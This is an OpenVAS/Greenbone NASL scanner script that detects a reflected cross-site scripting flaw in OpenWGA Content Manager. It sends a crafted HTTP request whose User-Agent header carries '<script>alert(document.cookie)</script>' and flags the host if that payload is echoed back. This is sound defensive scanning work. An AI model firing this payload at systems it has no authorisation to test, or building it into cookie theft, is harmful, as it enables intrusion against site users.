# Copyright (C) 2016 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:openwga:openwga_content_manager";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807687");
  script_version("2021-10-18T13:34:19+0000");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"last_modification", value:"2021-10-19 10:35:24 +0000 (Tue, 19 Oct 2021)");
  script_tag(name:"creation_date", value:"2016-05-03 16:40:17 +0530 (Tue, 03 May 2016)");
  script_name("OpenWGA Content Manager XSS Vulnerability");

  script_tag(name:"summary", value:"OpenWGA Content Manager is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted request via HTTP GET and checkc whether it is
  possible to confirm the vulnerability.");

  script_tag(name:"insight", value:"The flaw exists due to the input passed via the User-Agent HTTP
  header is not properly sanitized before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary
  HTML and script code in a user's browser session in context of an affected site.");

  script_tag(name:"affected", value:"- OpenWGA Content Manager 7.1.9 (Build 230)

  - OpenWGA Admin Client 7.1.7 (Build 82)

  - OpenWGA Server 7.1.9 Maintenance Release (Build 642)");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5316.php");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/136681/ZSL-2016-5316.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_openwga_content_manager_http_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("openwga/content_manager/http/detected");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

host = http_host_name(port:port);

url = dir + "/plugin-contentmanager/html/contentstore.int.html";

req = 'GET ' + url + ' HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Accept: */*\r\n' +
      'Accept-Language: en\r\n' +
      'User-Agent: <script>alert(document.cookie)</script>\r\n' +
      'Connection: keep-alive\r\n' +
      '\r\n';
res =  http_keepalive_send_recv(port:port, data:req);

if("<script>alert(document.cookie)</script>" >< res && res =~ "^HTTP/1\.[01] 200" && res =~ "OpenWG.+Server") {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);